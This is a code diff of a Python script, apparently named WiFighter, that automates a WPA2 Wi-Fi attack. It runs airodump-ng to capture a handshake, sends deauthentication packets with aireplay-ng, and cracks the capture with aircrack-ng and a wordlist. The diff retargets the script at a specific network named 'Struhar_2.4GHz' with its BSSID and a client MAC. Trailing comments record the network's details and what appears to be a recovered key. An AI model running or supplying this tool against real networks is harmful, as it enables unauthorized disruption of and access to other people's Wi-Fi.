@@ -4,13 +4,13 @@ import os, subprocess, time
 import multiprocessing
 
 
-interface = "wlp1s0mon"
+interface = "wlp1s0"
 
-ssid = "Test_Wifi"
-bssid = "42:ed:00:17:e0:d8"
-channel = "5"
+ssid = "Struhar_2.4GHz"
+bssid = "40:ed:00:17:e0:d8"
+channel = "6"
 
-client_mac = "9a:23:6b:36:1f:1b"
+client_mac = "02:26:02:03:25:e0"
 deauth_type = "client"
 
 output_dir = f"/home/filip/Coding/WiFighter/attacks/{ssid}"
@@ -32,7 +32,7 @@ def run_airodump(interface, bssid, channel, output_dir):
     if interface and bssid and channel and output_dir:
         #os.system(f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_dir} {interface} > /dev/null 2>&1")
         command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', f'{output_dir}/handshake', interface]
-        subprocess.Popen(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        subprocess.Popen(command, text=True)
 
 # Run aireplay-ng
 def run_aireplay(interface, bssid, client_mac, deauth_type):
@@ -66,11 +66,11 @@ print(f"[1] Deauth packet send to client {client_mac}")
 files_after = list_files(output_dir) # Get files after airodump-ng adds new
 
 output_file = cap_file(files_before, files_after) # Determine output_file in which airodump-ng stores
-print(output_file)
 
 # Wait and verify that handshake was captured successfuly
 captured = False
 print('[2] Waiting for handshake...')
+print(f'(saving capture to WiFighter/attacks/*SSID*/{output_file})')
 while not captured:
     if os.path.exists(f"{output_dir}/{output_file}"):
         #verify = os.popen(f"sudo aircrack-ng {output_file}-01.cap").read()
@@ -90,6 +90,7 @@ os.system(f"sudo aircrack-ng -w wordlist.txt {output_dir}/{output_file}") # Crac
 
 
 
-#  {'SSID': 'Test_Wifi', 'BSSID': '42:ed:00:17:e0:d8', 'Channel': '5', 'Signal': '-46', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}
-#  9a:23:6b:36:1f:1b
-#  81203666
+#  {'SSID': 'Struhar 2.4GHz', 'BSSID': '40:ed:00:17:e0:d8', 'Channel': '6', 'Signal': '-47', 'Band': '2.4 GHz', 'Encryption': 'WPA2', 'Auth': 'PSK', 'Cipher': 'CCMP'}
+
+#  2C:BE:EB:80:DE:7A
+#  -81203666-
